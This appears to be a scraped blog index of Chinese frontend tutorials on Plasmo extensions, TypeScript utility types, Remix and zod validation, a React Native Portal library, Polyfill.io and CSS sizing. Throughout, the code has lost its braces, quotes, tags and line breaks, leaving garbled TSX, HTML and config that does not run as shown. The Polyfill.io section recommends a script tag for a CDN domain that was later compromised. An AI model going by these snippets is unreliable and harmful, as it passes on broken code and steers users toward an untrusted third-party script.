声明式开发（自动生成 manifest.json） 将 UI 组件渲染到网页 扩展内置页面 扩展热重载 + React 模块热更新 .env* 文件 扩展储存 API 扩展通信 API 远程代码打包 (例如 Google Analytics) 支持多个浏览器和 manifest 版本 通过 BPP 进行自动部署 可选 Svelte 或 Vue 进行开发 安装首先安装一个 React 的模板： pnpm create plasmo example-dircd example-dirpnpm dev 如果想使用其他模板，可以使用该命令，可以在此 https://github.com/PlasmoHQ/examples/ 查看所有可用的模板 pnpm create plasmo --with-env 安装错误： sharp 安装失败 解决方法：https://sharp.pixelplumbing.com/install#chinese-mirror sharp 的安装包在外网，在国内有可能会下载失败，添加个 npm 代理，使用国内的镜像 npm config set sharp_binary_host https://npmmirror.com/mirrors/sharpnpm config set sharp_libvips_binary_host https://npmmirror.com/mirrors/sharp-libvips 这两条命令只能在 npm v9 以下的版本生效，用 v9 版本会报错 启动及调试插件 启动很简单使用 pnpm run dev命令即可启动一个开发服务器，启动成功后会在 build目录下生成开发产物： 打开 chrome 的插件管理页面（chrome:extensions），打开【开发者模式】开关，点击【加载已解压的扩展程序】，选择项目中的 build/chrome-mv3-dev目录： 加载成功后可以将其固定到状态栏中，便于后续开发： Plasm 有热重载功能，修改代码后，Plasm 会自动刷新当前激活的 tab，其它 tab 可以点击右下角的按钮手动刷新 各种 PagesPlasm 的文档中有好几种 page，不熟悉浏览器插件的估计会一脸懵逼，这里来总结下各种 page 的作用，以及出现的地点： Page 页面出现地点 说明 代码位置 extension pages（这些页面是浏览器插件机制内的页面，和 Plasm 框架无关，并且在浏览器中也有实体按钮） popup page 点击状态栏的插件图标后弹出，点击空白地方消失 popup.tsx或popupindex.tsx options page 右键点击插件图标，选择【选项】栏后，会打开个新页面，这个页面一般用作插件的配置页面 options.tsx或optionsindex.tsx new tab page 在点击主页按钮或者新建 tab 页时会打开该页面，同时浏览器的启动页配置会变成插件这个 page 在开发导航类的插件时会非常有用 newtab.tsx或newtabindex.tsx dev tools page 在开发者工具中会出现个新的 tab，这个的内容就是该页面 devtools.tsx或devtoolsindex.tsx 框架页面（这些页面都是框架提供的，通常以编程方式重定向到或打开这些页面） tab pages 使用场景：1. 首次安装插件时的欢迎页面2. 登录鉴权页面3. 需要更精细的路由控制时可以在以下 URL 的方式访问这些页面：chrome-extension://extension-id/tabs/delta-flyer.html tabs 目录下 sandbox pages 这个页面主要用在 iframe 里面，因为和主页面的上下文隔离，安全性更高，可以用来执行一些动态生成的代码 sandbox.ts file或sandboxes.ts 各种 Scripts上面介绍了各种 pages 的作用，现在又出现个多个 scripts 同样让人摸不着头脑，这里我们再来总结下他们的作用： script 说明 代码位置 content script content script 会运行在各个 tab 的上下文中，有多少个 tab 页，该脚本就会执行多少次，并且各个 script 不会互相干扰，并且和页面自身的 JavaScript 保持隔离使用场景：1. 从当前网页抓取数据2. 从当前网页中选择、查找元素并设置样式3. 将 UI 元素注入当前网页4. 将代码注入“main work”上下文 content.ts或者contents.ts background service worker 是一种后台服务，它可以处理一些长时间运行的任务，例如下载文件、缓存数据、推送通知等。这种方式可以节省内存，提高用户体验性，同时在离线状态下，依然能提供一些离线服务每个 tab 下都会有一个独立的 background service worker。这是因为每个 tab 都是一个独立的浏览器窗口，而 service worker 只能在后台运行，不能直接与网页的内容直接进行交互 background.ts或background.ts 通信 MessagePlasm 提供的 Message API 便于在各个组件之间的消息的发送，中继以及接收。官方文档介绍其 API 是声明式，类型安全，函数式以及基于 Promise，相比于我们自己封装，Plasm 提供的 API 更加的完善。 Plasm 将 Message API 封装到一个单独的 package 中，使用之前需要安装： pnpm install @plasmohq/messaging Message API 的分类如下： 下表中的单词缩写如下： Extension Pages - Ext-Pages Content Scripts - CS Background Service Worker - BGSW Messaging API From To One-time Long-lived Message Flow Ext-PagesCS BGSW Yes No Relay Flow Website CSBGSW Yes No Ports Ext-PagesCS BGSW No Yes Ports BGSW Ext-PagesCS No Yes Ports + Relay BGSW WebPage Yes Yes Message FlowMessage Flow 非常适合 extension pages，tab pages 或者 content scripts 等前台和 background service worker 后台服务的一次性通信。在将一些繁重的工作扔给后台处理和绕过 CORS 时用此通信方式就非常合适。 具体使用方法见官方文档该位置，这里不过多介绍 Relay Flow 该 API 还不太稳定，谨慎使用 看文档介绍该 API 用于 target webpage 和 background service worker 之间的通信，听着和上面的 Message Flow 很像。 但是研究下官方的示例，发现 Relay Flow 和 Message Flow 的作用截然不同。简单来说，如果 target webpage 也是你开发的，并且需要将 message 传递到配套的插件 background service worker 里，那么就可以将 content scripts 作为中转，完成消息的发送。 该 API 的使用场景还是比较局限的，但是在某些场景下可能会有奇效。 具体使用方法见官方文档该位置，这里不过多介绍 Ports 该 API 还不太稳定，谨慎使用 Messaging Ports API 是对插件原生的 port API 的抽象，主要用于和 background service worker 建立长链接。 具体使用方法见官方文档该位置，这里不过多介绍 存储 Storage环境变量 Environment Variables"},{"title":"TS 中常见工具类型的使用及实现","path":"/2023/06/05/4ff7282e236f/","content":"PickType, Keys 作用： 从 Type 选择一组 Keys 属性 使用： export interface Todo remark: string; required: boolean; hobby: string[];const A: PickTodo, remark | required = remark: 111, required: false,;// 表示A只能有 remark、required 实现： type PickT, K extends keyof T = [P in K]: T[P];;// K extends keyof T,这句表示，确保 K 是 T 的子集// keyof: 取 interface 的键后保存为联合类型// in: 取联合类型的值，主要用于数组和对象的构建// 用于实际开发，举个例子：// function getValue(o:object, key: string)// return o[key]// // const obj1 = name: 张三, age: 18 // const values = getValue(obj1, name)// 这样写丧失了 ts 的优势：// 无法确定返回值类型// 无法对key进行约束// function getValueT extends Object,K extends keyof T(o: T,key: K): T[K] // return o[key]// // const obj1 = name: 张三， age: 18// const values = getValue(obj1, name)// 如果第二个参数不是 obj1 中的参数就会报错 Readonly 作用：该 Readonly 会接收一个 泛型参数，并返回一个完全一样的类型，只是所有属性都会被 readonly 所修饰。也就是不可以再对该对象的属性赋值。 使用： interface Todo title: string; description: string;const todo: ReadonlyTodo = title: Hey, description: foobar,;todo.title = Hello; // Error: cannot reassign a readonly propertytodo.description = barFoo; // Error: cannot reassign a readonly property 实现： type ReadonlyT = readonly [P in keyof T]: T[P];;// readonly修饰符，首先是一个关键字// 对类中的属性成员进行修饰，修饰之后，该属性成员就不能修改了，只能够进行访问","tags":["Typescript"],"categories":["Typescript"]},{"title":"Remix - 表单&接口入参校验","path":"/2023/04/18/40fc3d9c3a91/","content":"前言Remix 是 React Router 团队开发的基于 React 框架的全栈 Web 框架。既然是基于 React 框架，那么在 React 中能够使用的表单校验方案，同样适用于 Remix。 Remix 中的客户端表单校验可以采用 React 的表单校验方案，但是 Remix 作为一个全栈框架，自然是有服务端接口的，那么其入参校验也是否可以采用 node 后端通用的参数校验方案？ 下面我们就看看在前后端都是怎么校验参数的 React 表单校验框架内置校验用过 React 组件库同学应该都知道，这些组件库内部一般都会内置一个表单校验模块，例如 Ant Design ： import React from react;import Button, Checkbox, Form, Input from antd;const onFinish = (values: any) = console.log(Success:, values);;const onFinishFailed = (errorInfo: any) = console.log(Failed:, errorInfo);;const App: React.FC = () = ( Form name=basic labelCol= span: 8 wrapperCol= span: 16 style= maxWidth: 600 initialValues= remember: true onFinish=onFinish onFinishFailed=onFinishFailed autoComplete=off Form.Item label=Username name=username rules=[ required: true, message: Please input your username! ] Input / /Form.Item Form.Item label=Password name=password rules=[ required: true, message: Please input your password! ] Input.Password / /Form.Item Form.Item name=remember valuePropName=checked wrapperCol= offset: 8, span: 16 CheckboxRemember me/Checkbox /Form.Item Form.Item wrapperCol= offset: 8, span: 16 Button type=primary htmlType=submit Submit /Button /Form.Item /Form);export default App; 独立校验模块脱离组件库框架后，前端社区里还是有很多可选的校验模块，这里我只介绍两个我使用过并且绝对特别好用的库： react-hook-form从名字中就能看出，这个库主要适用于 React 框架，因此用原生开发时需要校验表单强烈推荐该库，并且其也能很好的融入现有组件库。 import useForm from react-hook-form;export default function App() const register, handleSubmit, watch, formState: errors = useForm(); const onSubmit = data = console.log(data); console.log(watch(example)); // watch input value by passing the name of it return ( /* handleSubmit will validate your inputs before invoking onSubmit */ form onSubmit=handleSubmit(onSubmit) /* register your input into the hook by invoking the register function */ input defaultValue=test ...register(example) / /* include validation with required or other standard HTML validation rules */ input ...register(exampleRequired, required: true ) / /* errors will return when field validation fails */ errors.exampleRequired spanThis field is required/span input type=submit / /form ); Zod 这个库就是个纯粹的字段校验的库了，正是因为纯粹，社区为其开发了各种适配器，可以将 zod 应用到任何需要字段校验的地方，下面看下 zod 如何应用在 React 表单校验： import z from zod;import useZorm from react-zorm;const FormSchema = z.object( name: z.string().min(1), password: z .string() .min(10) .refine((pw) = /[0-9]/.test(pw), Password must contain a number),);function Signup() const zo = useZorm(signup, FormSchema, onValidSubmit(e) e.preventDefault(); alert(Form ok! + JSON.stringify(e.data, null, 2)); , ); const disabled = zo.validation?.success === false; return ( form ref=zo.ref Name: input type=text name=zo.fields.name() className=zo.errors.name(errored) / zo.errors.name((e) = ( ErrorMessage message=e.message / )) Password: input type=password name=zo.fields.password() className=zo.errors.password(errored) / zo.errors.password((e) = ( ErrorMessage message=e.message / )) button disabled=disabled type=submit Signup! /button preValidation status: JSON.stringify(zo.validation, null, 2)/pre /form ); 服务端接口入参校验在服务端校验入参本质上就是校验字段，那么先看下其它的 node 服务端框架都是怎么校验参数的： Egg Egg 使用 egg-validate 模块进行参数校验，基本用法如下： class XXXController extends app.Controller // ... async XXX() const ctx = this; ctx.validate( system : type: string, required: false, defValue: account, desc: 系统名称, token : type: string, required: true, desc: token 验证, redirect: type: string, required: false, desc: 登录跳转 ); // if (config.throwError === false) if(ctx.paramErrors) // get error infos from `ctx.paramErrors`; let params = ctx.params; let query, body = ctx.request; // ctx.params = validater.ret.params; // ctx.request.query = validater.ret.query; // ctx.request.body = validater.ret.body; // ... ctx.body = query; // ... nestjs nestjs 主要使用第三方的 class-validator 来进行参数校验。 import Injectable, PipeTransform, ArgumentMetadata, ValidationError, HttpException, HttpStatus from @nestjs/common;import plainToClass from class-transformer;import validate from class-validator;/** * 这是一个全局的参数验证管道，基于class-transformer * 如果失败，则会抛出HttpException * 在main.ts的nestApp要将它设为全局的 */@Injectable()export class ValidationPipe implements PipeTransform async transform(value: any, metatype : ArgumentMetadata) if (!metatype || !this.toValidate(metatype)) return value; const object = plainToClass(metatype, value); const errors = await validate(object); const errorList: string[] = []; const errObjList: ValidationError[] = [...errors]; do const e = errObjList.shift(); if (!e) break; if (e.constraints) for (const item in e.constraints) errorList.push(e.constraints[item]); if (e.children) errObjList.push(...e.children); while (true); if (errorList.length 0) throw new HttpException(请求参数校验错误: + errorList.join(), HttpStatus.INTERNAL_SERVER_ERROR); return object; private toValidate(metatype: Function): boolean const types: Function[] = [String, Boolean, Number, Array, Object]; return !types.includes(metatype); 从上面的两个框架可以看出来，对于如何进行参数校验，大家的处理过程都是差不多的，都是先定义一套规则，然后用这套规则去校验字段。 那么在 remix 中校验入参自然也是这个流程，下面的示例中会使用 zod 来校验参数： import type ActionArgs from @remix-run/node;import z from zod;import parseFormAny, useZorm from react-zorm;const LoginSchema = z.object( email: z .string( required_error: Email is required ) .email( message: Invalid email ), password: z .string( required_error: Password is required ) .min(8, message: Password must be at least 8 characters ), remember: z.optional(z.boolean()),);export async function action( request : ActionArgs) const formData = await request.formData(); const result = await LoginSchema.safeParseAsync(parseFormAny(formData)); if (!result.success) return json( errors: result.error , status: 400 ); 前后端校验统一上面分别介绍了如何在前后端校验参数，但是如果是一个前后端分离的项目，那么前后端分开校验并且使用不同的校验方案自然是没有问题的，但是在 remix 这么一个全栈框架里使用两套校验方案，多少显得有些冗余了，而且很容易导致前后端校验不一致的问题。 那么有没有一种方案，可以只写一套校验规则，同时适用于前后端吗？ 自然是可以的，其实上文已经给出了答案，就是使用 zod 来校验参数，下面给出个完整的示例： import React from react;import IconBrandGithub, IconBrandTwitter from @tabler/icons-react;import Link, Form from @remix-run/react;import type ActionArgs from @remix-run/node;import json, redirect from @remix-run/node;import parseFormAny, useZorm from react-zorm;import z from zod;import LoginLayout from ~/components/user-layout;import FormInner from ~/components/form/form-inner;import Input from ~/components/input;import Button from ~/components/button;import Checkbox from ~/components/checkbox;import loginUser, setAuthSession from ~/modules/auth;import authCookie from ~/integrations/supabase;const LoginSchema = z.object( email: z .string( required_error: Email is required ) .email( message: Invalid email ), password: z .string( required_error: Password is required ) .min(8, message: Password must be at least 8 characters ), remember: z.optional(z.boolean()),);export async function action( request : ActionArgs) const formData = await request.formData(); const result = await LoginSchema.safeParseAsync(parseFormAny(formData)); let session = await authCookie.getSession(request.headers.get(Cookie)); if (!result.success) return json( errors: result.error , status: 400 ); const accessToken, refreshToken, error = await loginUser( result.data.email, result.data.password ); if (error || !accessToken || !refreshToken) return json( formError: error || Something went wrong , 403); session = setAuthSession(session, accessToken, refreshToken); return redirect(/, headers: Set-Cookie: await authCookie.commitSession(session), , );const Login: React.FC = () = const zo = useZorm(NewQuestionWizardScreen, LoginSchema); const renderFooter = () = ( div className=hr-textor/div div className=card-body div className=row div className=col Button href=# icon=IconBrandGithub className=text-github / block Login with Github /Button /div div className=col Button href=# icon=IconBrandTwitter className=text-twitter / block Login with Twitter /Button /div /div /div / ); return ( LoginLayout title=Login to your account footer=renderFooter() description= Dont have account yet? Link to=/sign-upSign up/Link / Form ref=zo.ref method=post replace FormInner label=Email address required error=zo.errors.email()?.message Input name=zo.fields.email() type=email placeholder=your@email.com / /FormInner FormInner label=Password required labelSuffix=Link to=/forgot-passwordI forgot password/Link error=zo.errors.password()?.message Input name=zo.fields.password() type=password placeholder=Your password / /FormInner div className=mb-2 Checkbox name=zo.fields.remember() Remember me on this device /Checkbox /div div className=form-footer Button buttonType=submit type=primary block Sign in /Button /div /Form /LoginLayout );;export default Login;","tags":["React","Remix"],"categories":["React","Remix"]},{"title":"React Native 组件库 - Portal 组件","path":"/2023/04/02/93b995cb58f9/","content":"React 中的 Portal 组件想必对 React 熟悉的同学都不会陌生，它提供了一种将子节点脱离父节点渲染到其它 DOM 节点的方案。 createPortal 文档：https://react.dev/reference/react-dom/createPortal#usage 默认下情况下 JSX 中的元素顺序就是其渲染到真实 DOM 的顺序： function MyComponent() return ( div style= border: 2px solid black pThis child is placed in the parent div./p pThis child is placed in the document body./p /div ); 渲染后的 DOM 结构如下： body div id=root ... div style=border: 2px solid black pThis child is placed inside the parent div./p pThis child is placed in the document body./p /div ... /div/body 使用 createPortal 后 import createPortal from react-dom;function MyComponent() return ( div style= border: 2px solid black pThis child is placed in the parent div./p createPortal( pThis child is placed in the document body./p, document.body ) /div ); p 表单虽然还在 div 标签里，但是最终渲染到 DOM 后却在 document.body 里： body div id=root ... div style=border: 2px solid black pThis child is placed inside the parent div./p /div ... /div pThis child is placed in the document body./p/body createPortal 因为其脱离父元素的特性，最常见的场景就是 Modal，Drawer 等组件，以 Ant Design 举例： import React, useState from react;import Button, Modal from antd;const App: React.FC = () = const [isModalOpen, setIsModalOpen] = useState(false); const showModal = () = setIsModalOpen(true); ; const handleOk = () = setIsModalOpen(false); ; const handleCancel = () = setIsModalOpen(false); ; return ( Button type=primary onClick=showModal Open Modal /Button Modal title=Basic Modal open=isModalOpen onOk=handleOk onCancel=handleCancel pSome contents.../p pSome contents.../p pSome contents.../p /Modal / );;export default App; 在 JSX 中 Button 和 Modal 虽然是在同一级，但是在渲染到真实 dom 后，Modal 却是渲染成 body 的直接子元素： 为什么需要 Portal 组件这是因为我们经常会遇到需要管理组件层级的情况，最常见的就是页面出现多个 Modal，如何管理这些 Modal 就是个很复杂的问题，第一个我们一般会想到用 z-index 调整组件的层级，首先不提手动管理 z-index 合不合理，就是 z-index 本身也不能适用所有场景，它也是有局限性的： 必须是一个定位的（即其 position 属性值不是 static）脱离了文档流的元素，z-index 才能生效 z-index 不一定是值越大越靠前。实际上在 CSS 中元素的层级是由层叠上下文决定的，z-index 只在同一个层叠上下文中比较才有意义，就像省长的秘书和市长的秘书，虽然都是秘书，但是这有可比性吗。看以下代码： div style=position:relative; z-index:auto; img src=mm1.jpg style=position:absolute; z-index:2; / -- 横妹子 --/divdiv style=position:relative; z-index:auto; img src=mm2.jpg style=position:relative; z-index:1; / -- 竖妹子 --/div 横妹子 会盖在 竖妹子身上，这是因此两个 img 的父级在同一层叠上下文中，这是 z-index 的大小比较就有了意义。 简单修改下，将 z-index:auto改成 z-index:0，这时两张图片的层级就发生了颠倒： div style=position:relative; z-index:0; img src=mm1.jpg style=position:absolute; z-index:2; / -- 横妹子 --/divdiv style=position:relative; z-index:0; img src=mm2.jpg style=position:relative; z-index:1; / -- 竖妹子 --/div 这是因为 z-index:0创建了一个层级上下文，这时两个 img 会先比较父元素的层级，而由于两者的层叠顺序一样，会按照 DOM 流的顺序比较层级大小，自然是后面的 竖妹子 覆盖在 横妹子 上，其实这时候子元素的 z-index就是打酱油的，改成任何值都不会影响他们的层级顺序。 不明白什么是 「层叠上下文」的，可以看张鑫旭的这篇文章：https://www.zhangxinxu.com/wordpress/2016/01/understand-css-stacking-context-order-z-index/ 话说回来，用 z-index 来调整层级有这么多限制，肯定是不行的，我们需要的是一个简单高效的方式，这就不得不提 Portal 组件的高明之处了： 由于 Portal 会将子节点脱离父节点所在的上下文，布局就可以不受父节点的影响 Portal 可以将子节点统一插入到 body 中，这是会在同一个层叠上下文中，层级的顺序取决于在在 BOM 流的顺序，也可以说是取决于 Portal 执行的顺序 使用 Portal 组件虽然 Portal 特别贴合某些使用场景，但是 React Native 却没有提供原生的 Portal 组件，我们在 React 中常用的 Portal 组件，是 react-dom 提供的，它只适用于浏览器这样的宿主环境： import Portal from react-dom; 得益于前端活跃到夸张的社区，这类实用的组件自然早早就有了开源方案 - react-native-portal 下面我们看下如何使用这个组件： 安装该组件 ## npmnpm install @gorhom/portal## yarnyarn add @gorhom/portal## pnpmpnpm install @gorhom/portal 添加全局 context export const App = () = ( PortalProvider ... your app goes here /PortalProvider); 然后在需要的地方使用 Portal 组件即可 const BasicScreen = () = return ( ... Portal Text Text to be teleported to the root host /Text /Portal ... );; 那么所有使用 Portal 组件的子元素都会被插入到 PortalProvider 中，如果需要改变被插入的位置，可以使用 PortalHost自定义插入位置： const CustomView = () = return ( ... PortalHost name=CustomPortalHost / ... );; 更多使用方法见官方文档，这里提个文章没有提到的使用技巧。Portal组件必须要在 React Component 中使用，那么一般的 function 中如何才能使用 Portal： // 1. 首先创建个 ref，作为 portal 实例的引用export type PortalService = ReturnTypetypeof usePortal;export const PortalRef = React.createRefPortalService() as MutableRefObjectPortalService;// 2. 在 React Component 中，引用 portal 实例const InitializePortalRef = () = const portal = usePortal(); PortalRef.current = portal; return null;;// 3. 将 InitializePortalRef 组件放置到 PortalProvider 中PortalProvider InitializePortalRef / children/PortalProvider// 4. 通过 PortalRef 使用 portal// 注意：PortalRef 只能在 PortalProvider 初始化后使用PortalRef.current?.removePortal(key);PortalRef.current?.updatePortal(key, renderToast());PortalRef.current?.addPortal(key, renderToast()); 实现 Portal 组件上面介绍了如何使用开源社区的 Portal 组件，下面我们就来分析下它是如何实现的，react-native-portal 组件的 API 并不多，只有三个组件 Portal，PortalHost，PortalProvider 和一个自定义 hook usePortal。 先看下 PortalProvider 这个组件内部都做了什么： const PortalProviderComponent = ( rootHostName = root, shouldAddRootHost = true, children,: PortalProviderProps) = const [state, dispatch] = useReducer(reducer, INITIAL_STATE); return ( PortalDispatchContext.Provider value=dispatch PortalStateContext.Provider value=state children shouldAddRootHost PortalHost name=rootHostName / /PortalStateContext.Provider /PortalDispatchContext.Provider );; 这个组件中通过 useReducer 初始化了两个 context： PortalDispatchContext 里面定义了一系列方法，包含 AddUpdatePortalAction，RemovePortalAction, RegisterHostAction，UnregisterHostAction，从名字就能看出来这些方法是做什么的 PortalStateContext 里面存储了上面的一系列方法收集的节点 通过 useReducer 定义的 dispatch 使用起来还是有些繁琐了，所以通过 usePortal 再封装下 import ReactNode, useCallback, useContext from react;import ACTIONS from ../state/constants;import PortalDispatchContext from ../contexts/portal;export const usePortal = (hostName: string = root) = const dispatch = useContext(PortalDispatchContext); if (dispatch === null) throw new Error( PortalDispatchContext cannot be null, please add PortalProvider to the root component. ); //#region methods const registerHost = useCallback(() = dispatch( type: ACTIONS.REGISTER_HOST, hostName: hostName, ); // eslint-disable-next-line react-hooks/exhaustive-deps , []); const deregisterHost = useCallback(() = dispatch( type: ACTIONS.DEREGISTER_HOST, hostName: hostName, ); // eslint-disable-next-line react-hooks/exhaustive-deps , []); const addUpdatePortal = useCallback((name: string, node: ReactNode) = dispatch( type: ACTIONS.ADD_UPDATE_PORTAL, hostName, portalName: name, node, ); // eslint-disable-next-line react-hooks/exhaustive-deps , []); const removePortal = useCallback((name: string) = dispatch( type: ACTIONS.REMOVE_PORTAL, hostName, portalName: name, ); // eslint-disable-next-line react-hooks/exhaustive-deps , []); //#endregion return registerHost, deregisterHost, addPortal: addUpdatePortal, updatePortal: addUpdatePortal, removePortal, ;; 准备工作都准备好了，看下如何收集 Portal 中的子节点（简化了下源码，只保留关键的地方） const PortalComponent = ( children, name: _providedName ) = const addPortal: addUpdatePortal, removePortal = usePortal(hostName); const handleOnMountRef = useRefFunction(); const handleOnUnmountRef = useRefFunction(); const handleOnUpdateRef = useRefFunction(); // 在初次渲染后通过 addUpdatePortal 收集 children 到 context 中 handleOnMountRef.current = () = addUpdatePortal(name, children); ; // 组件销毁时，也需要从 context 中销毁对应的 children handleOnUnmountRef.current = () = removePortal(name); ; // children 变动时，同步到 context 中 handleOnUpdateRef.current = () = addUpdatePortal(name, children); ; useEffect(() = handleOnMountRef.current?.(); return () = handleOnUnmountRef.current?.(); // remove callbacks refs handleOnMountRef.current = undefined; handleOnUnmountRef.current = undefined; handleOnUpdateRef.current = undefined; ; , []); useEffect(() = handleOnUpdateRef.current?.(); , [children]); // 返回个 null，不渲染 children return null;; 现在已经收集到 Portal 中的子元素，下面就是将它们渲染出来了 import React, memo, useEffect from react;import usePortalState from ../../hooks/usePortalState;import usePortal from ../../hooks/usePortal;import type PortalHostProps from ./types;const PortalHostComponent = ( name : PortalHostProps) = //#region hooks const state = usePortalState(name); const registerHost, deregisterHost = usePortal(name); //#endregion //#region effects useEffect(() = registerHost(); return () = deregisterHost(); ; // eslint-disable-next-line react-hooks/exhaustive-deps , []); //#endregion //#region render return state.map((item) = item.node)/; //#endregion;export const PortalHost = memo(PortalHostComponent);PortalHost.displayName = PortalHost; 渲染就很简单了，从 context 中取出节点，通过 map 渲染就出就完事了，唯一需要注意的是，Host 是有分组的，每个 Host 组件只负责渲染它这个分组内的节点即可 总结Portal 组件虽然很基础，但是却广泛应用在 Modal 等组件中，可以让我们免于手动管理组件层级问题，同时其脱离文档流的能力有时也会有些出乎意料的应用。 上面提到的都是 React 中的 Portal 组件，那么 Vue 中有没有类似的组件呢？ 在 Vue 3 之前是没有的，需要使用社区提供的开源方案 - portal-vue。Vue 3 后有了原生的组件 - Teleport。 殊途同归，可见 Portal 不局限于一个框架，是个通用的解决方案。"},{"title":"详解 Polyfill.io","path":"/2023/03/22/4903aabec5c6/","content":"tags: Babel Polyfill categories: Babel Polyfill 今天看了篇文章「用了 babel 还需要 polyfill 吗？？？」，文章中明确回答了用了 babel 后还需要 polyfill。babel 只是一个平台，本生不提供任何功能，需要实现各种特性，必须依赖各种插件。如果 babel 没有使用任何插件，那么代码经过 babel 编译后会原封不动的返回。 什么是 Polyfill ? A polyfill is a piece of code (usually JavaScript on the Web) used to provide modern functionality on older browsers that do not natively support it. polyfill 就是一段补丁代码，它能够让当前浏览器不支持的方法通过用支持的方法重写来获得支持。 比如 IE11 不支持 Promise，而我们又需要在项目里用到，写了这样的代码： script Promise.resolve(bar).then(function (foo) document.write(foo); );/script 这时在 IE 下运行就会报错了 然后在此之前加上补丁 script src=https://cdn.jsdelivr.net/npm/promise-polyfill@8/dist/polyfill.min.js/scriptscript Promise.resolve(bar).then(function (foo) document.write(foo); );/script 刷新浏览器，就可以正常运行了 Polyfill 方案core-js @babelpolyfill Core-js 是 JavaScript 标准库中最流行也最常用的 polyfill，为最新的 ECMAScript 标准和提案提供支持，包括古老的 ES5 功能到迭代器助手等前沿选项； [@babel/polyfill](https://babeljs.io/docs/en/next/babel-polyfill.html) 这是 core-js的一个包装器，引入的是 core-js 的 stable 特性，因此从 Babel 7.4.0 之后，这个包就不再维护了，取而代之的是直接引用 font style=color:rgb(68, 73, 80);core-js/stable/font： Babel 7.4.0 之前： import @babel/polyfill; Babel 7.4.0 之后改为： import core-js/stable;import regenerator-runtime/runtime; 因为 core-js 中 JavaScript 标准库的一个 polyfill，不仅支持最新的 ECMAScript 标准，而且连标准库提案都包含在内，因此引入这一个库，es6，es7 等新特性就可以随便写了，不然担心兼容性问题。 但是与此同时，这也带来个很大的缺点，不管你浏览器是否支持，也不管你项目是否有用到，都全量引入了，这在一些性能和带宽严苛的环境下会带来很大的麻烦。 @babelpreset-env @babelpreset-env 是 babel 的一组预设，其中就有 pollyfill 的相关配置 @babelpreset-env 有两种不同的模式，可以通过 font style=color:rgb(36, 41, 47);useBuiltIns/font选项启用，其有三个参数： entry usage false 其中，entry和 usage都可以优化 core-js 的引用，其区别在于： useBuiltIns: entry使用该选项，font style=color:rgb(36, 41, 47);@babel/preset-env/font将找到入口文件里引入的 core-js，并替换为 targets 浏览器环境需要的补丁列表 .babelrc 配置如下： presets: [ [@babel/env, useBuiltIns: entry, targets: chrome: 72 ] ] 入口文件引入 core-js： import core-js/stable;import regenerator-runtime/runtime; 转换目标是 chrome 72 时，将被转化为： import core-js/modules/es.array.unscopables.flat;import core-js/modules/es.array.unscopables.flat-map;import core-js/modules/es.object.from-entries;import core-js/modules/web.immediate; 如果转化目标是 chrome 73（完全支持 ES2019 标准库），将得到个更简短的引入： import core-js/modules/web.immediate; useBuiltIns: usage当启用这个选项时，font style=color:rgb(36, 41, 47);@babel/preset-env/font只会在每个文件顶部添加仅用于当前使用的、目标环境不支持的功能的 polyfills 例如： const set = new Set([1, 2, 3]);[1, 2, 3].includes(2); 当转化目标是老旧的低版本浏览器，比如 ie 11，上面的代码将被转化为： import core-js/modules/es.array.includes;import core-js/modules/es.array.iterator;import core-js/modules/es.object.to-string;import core-js/modules/es.set;const set = new Set([1, 2, 3]);[1, 2, 3].includes(2); 当目标是 chrome 72时，不会导入任何 polyfills，因为目标环境不需要这些 polyfills： const set = new Set([1, 2, 3]);[1, 2, 3].includes(2); 上面不管是 font style=color:rgb(36, 41, 47);entry/font还是 font style=color:rgb(36, 41, 47);usage/font都能够实现 polyfill 一定的按需引入，好是好，但是仔细想想，还是有不少问题的： 特性列表是按浏览器整理的，那怎么知道哪些特性我用了，哪些没有用到，没有用到的部分也引入了是不是也是冗余？ 补丁是打包到静态文件的，如果我配置 targets 为 chrome: 62, ie: 9，那意味着 chrome 62 也得载入 ie 9 相关的补丁，这也是一份冗余 我们是基于 core-js 打的补丁，所以只会包含 ecmascript 规范里的内容，其他比如说 dom 里的补丁，就不在此列，应该如何处理？ 手动引入前面的方案都是基于 babel 编译器的方案，虽然低效但是直观有用。如果是在一些特别在乎性能的场景，比如 H5 营销页面，宁可牺牲效率也要最求性能。那么可以手动引入 core-jsmodules 下的文件，缺啥加啥就好。 在线补丁上面啰嗦了一大堆，和本文的主题 Polyfill.io 有什么关系？前面都是为了解决如何引入特性列表的问题，有了特性列表，要做到按需下载，就需要用到在线补丁的服务了。这就到了本文的主题，polyfill.io - 目前最流行的在线补丁服务。 你可以尝试在不同的浏览器下访问 https://polyfill.io/v3/polyfill.min.js 这个文件，Polyfill.io 服务端会根据用户访问携带的浏览器 UA 返回不同的 pollfill 文件，真正做到了按需加载。你需要做的仅仅是在页面上引入这个文件： script src=https://polyfill.io/v3/polyfill.min.js/script 然后在 Chrome（作者用的 Chrome 是 111 版本）下的输出是： /* Polyfill service v3.111.0 * Disable minification (remove `.min` from URL path) for more info */ 啥都没有，因为新版本的 Chrome 已经完整支持了 ECMAScript 标准和提案的所有特性，没啥需要 pollyfill 的。 Polyfill.io 不仅提供了 CDN 服务，还开源了 polyfill-service 供我们自己搭建使用。针对国内访问 Polyfill.io 较慢的问题，可以使用阿里云的 polyfill 服务替换 https://polyfill.alicdn.com/polyfill.min.js 阿里云不仅仅是 Polyfill.io，它还做了一些优化，在作者的 chrome 上访问上面的链接： 会加载一些额外的代码，这表现和 Polyfill.io 不一样，因此不能简单的把阿里云的 polyfill 当成 Polyfill.io 的平替，至于阿里云做了哪些优化，本文就不再讨论了，有机会另开文章介绍。 当然改方案也不是完美的，最起码它有以下两个缺点： 多了一次 http 请求 针对国内乱七八糟的浏览器是否能够准确识别从而返回需要的 polyfill 代码就不得而知了 完整 Pollyfill 方案本文关于 Polyfill 方案的介绍大部分都是来自大佬们的文章，同时也包含了一些自己的思考。是时候来个总结，关于 Pollyfill 我认为 按需特性探测 + 在线补丁 才是一个比较完整的方案： 按需特性探测可以使用 font style=color:rgb(36, 41, 47);@babel/preset-env/font配上 font style=color:rgb(36, 41, 47);targets/font以及 font style=color:rgb(36, 41, 47);useBuiltIns: usage/font，可以保障特性集的最小化。 在线补丁可以使用 Polyfill.io 的方案（大公司可以使用自己搭建的服务），可以保障遇到目标浏览器不支持的特性是能做到按需加载，给业务再做一层兜底。 参考 https://juejin.cn/post/6845166891015602190#heading-2 https://github.com/sorrycc/blog/issues/80 https://github.com/zloirock/core-js/blob/master/docs/2019-03-19-core-js-3-babel-and-a-look-into-the-future.md"},{"title":"【转载】CSS 内在尺寸教程（min-content、max-content 和 fit-content ）","path":"/2023/03/02/23c511e540c1/","content":"原文链接：Intrinsic Sizing In CSS，by Ahmad Shadeed CSS 中存在两种尺寸：内在尺寸（intrinsic）和外在尺寸（extrinsic）。为元素的 width、height 